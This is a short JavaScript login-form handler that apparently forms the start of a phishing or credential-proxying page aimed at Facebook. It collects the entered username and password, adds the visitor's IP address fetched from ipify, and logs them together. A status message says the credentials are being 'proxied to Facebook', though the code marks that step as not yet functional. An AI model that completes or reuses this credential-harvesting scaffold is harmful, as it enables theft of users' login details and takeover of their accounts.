function getIpAddress() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(error => {
      console.error('Error fetching IP:', error);
      return 'Unknown';
    });
}

// Form submission handler
document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const statusMessage = document.getElementById('statusMessage');

  // Show processing message
  statusMessage.style.display = 'block';
  statusMessage.textContent = 'Processing your login...';

  // Get IP and log details
  getIpAddress().then(ip => {
    const loginDetails = { username, password, ip };
    console.log('Login attempt:', loginDetails);
    // Simulate proxying (placeholder)
    setTimeout(() => {
      statusMessage.textContent = 'Proxying to Facebook... (not functional yet) IP: ' + ip;
      setTimeout(() => {
        statusMessage.style.display = 'none'; // Hide after delay
      }, 2000);
    }, 1000);
  });
});